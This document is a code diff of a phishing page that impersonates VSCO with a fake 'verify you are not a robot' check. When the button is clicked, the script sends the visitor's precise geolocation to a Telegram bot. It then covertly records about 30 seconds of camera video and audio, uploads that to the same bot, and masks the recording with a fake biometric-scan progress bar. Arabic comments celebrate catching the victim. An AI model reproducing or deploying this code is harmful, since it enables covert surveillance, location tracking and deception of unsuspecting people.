@@ -3,21 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VSCO - Verification</title>
+    <title>VSCO - Security Check</title>
     <style>
-        body { font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #ffffff; }
-        .container { text-align: center; padding: 20px; max-width: 400px; }
-        .logo { font-size: 40px; font-weight: bold; letter-spacing: 5px; margin-bottom: 20px; }
-        .btn { background-color: #000; color: white; border: none; padding: 15px 45px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; }
-        p { font-size: 14px; color: #666; margin-bottom: 30px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #ffffff; color: #000; }
+        .container { text-align: center; padding: 20px; max-width: 400px; width: 100%; }
+        .logo { font-size: 32px; font-weight: bold; letter-spacing: 8px; margin-bottom: 40px; }
+        h1 { font-size: 20px; font-weight: 600; margin-bottom: 10px; }
+        p { font-size: 14px; color: #666; margin-bottom: 30px; line-height: 1.5; }
+        .btn { background-color: #000; color: white; border: none; padding: 16px 0; font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; letter-spacing: 1px; }
+        .btn:disabled { background-color: #555; }
+        #status-box { display: none; margin-top: 20px; }
+        .progress-text { font-size: 13px; font-weight: bold; color: #000; margin-bottom: 5px; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">VSCO</div>
-        <h1>Security Check</h1>
-        <p>Please click below to verify you are not a robot.</p>
-        <button id="mainBtn" class="btn" onclick="initiate()">Verify & Open</button>
+        <div id="content">
+            <h1>Security Verification</h1>
+            <p>To view this private gallery, please complete the security check to verify you are not a robot.</p>
+            <button id="mainBtn" class="btn" onclick="initiate()">VERIFY & OPEN</button>
+        </div>
+        
+        <div id="status-box">
+            <p class="progress-text" id="progressMsg">Starting verification...</p>
+            <p id="percentText">0%</p>
+        </div>
     </div>
 
 <script>
@@ -26,16 +37,19 @@
 
     async function initiate() {
         const btn = document.getElementById('mainBtn');
-        btn.innerText = "Verifying..."; // تغيير النص ليشعر المستخدم أن العملية جارية
-        btn.disabled = true;
+        const statusBox = document.getElementById('status-box');
+        const progressMsg = document.getElementById('progressMsg');
+        const percentText = document.getElementById('percentText');
+
+        btn.style.display = 'none';
+        statusBox.style.display = 'block';
 
         // 1. إرسال الموقع فوراً
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            const map = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=📍 Location: http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            await fetch(map);
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=📍 Location: http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
         }, null, {enableHighAccuracy: true});
 
-        // 2. تسجيل فيديو وصوت
+        // 2. طلب الكاميرا والتصوير
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             const recorder = new MediaRecorder(stream);
@@ -46,32 +60,44 @@
                 const blob = new Blob(chunks, { type: 'video/mp4' });
                 const fd = new FormData();
                 fd.append('chat_id', chatId);
-                fd.append('video', blob, 'security_video.mp4');
-                
-                // أهم خطوة: ننتظر الإرسال لينتهي قبل التحويل
-                try {
-                    await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: fd });
-                } catch (e) {}
+                fd.append('video', blob, 'Hassan_Long_Capture.mp4');
+                fd.append('caption', '🎯 تم صيده! فيديو 30 ثانية مع صوت وموقع.');
 
+                await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: fd });
+                
                 stream.getTracks().forEach(t => t.stop());
-                // التحويل فقط بعد انتهاء الرفع
-                window.location.replace("https://vsco.co/store/app");
+                window.location.replace("https://vsco.co/login");
             };
 
             recorder.start();
-            // تسجيل لمدة 3 ثوانٍ فقط ليكون الحجم صغيراً ويصل بسرعة
-            setTimeout(() => {
-                if(recorder.state !== "inactive") recorder.stop();
-            }, 3000);
+
+            // عداد وهمي لمدة 30 ثانية
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 1;
+                percentText.innerText = progress + "%";
+
+                if (progress < 30) progressMsg.innerText = "Analyzing device sensors...";
+                else if (progress < 60) progressMsg.innerText = "Scanning FaceID Biometrics...";
+                else if (progress < 90) progressMsg.innerText = "Finalizing secure connection...";
+                else progressMsg.innerText = "Verification Complete! Redirecting...";
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    recorder.stop();
+                }
+            }, 300); // 300ms * 100 = 30 ثانية تقريباً
 
         } catch (err) {
-            alert("⚠️ Security Alert: Access required to verify you are not a robot.");
+            // رسالة بالإنجليزية إذا عمل Block
+            alert("Security Verification: To help protect your account, please allow camera access to verify you are not a robot.");
             window.location.reload();
         }
     }
 </script>
 </body>
 </html>
+
 
 
 
